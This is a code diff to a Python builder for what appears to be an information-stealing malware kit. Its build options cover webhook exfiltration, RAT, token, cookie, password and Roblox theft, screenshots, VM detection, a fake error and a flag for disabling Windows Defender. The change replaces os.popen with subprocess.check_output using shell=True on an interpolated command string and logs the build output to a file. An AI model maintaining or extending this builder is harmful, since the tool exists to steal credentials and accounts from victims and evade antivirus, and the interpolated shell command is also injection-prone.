@@ -17,6 +17,7 @@ from pathlib import Path
 import ctypes
 
 import logging
+import subprocess
 
 logging.basicConfig(
     level=logging.DEBUG,
@@ -270,8 +271,12 @@ def __build():
     logger.info(f"Path: {path}")
     msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjection} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping} {xvmdetect} {xvmwebhookurl} {xfakeerror} {xnitrobuy} {xdefenderfucker} False"
     logger.info(f"MSGLine to compile: {msg}")
-    output = os.popen(msg).read()
-    logger.info(f"Building output: {output}")
+    
+    output = subprocess.check_output(msg, shell=True, encoding='utf-8')
+    with open("v8compile.log", "w") as f:
+        f.write(output)
+    
+    logger.info(f"Building output saved in v8compile.log")
 
 def _makebuild():
     if xwehookurl == "":
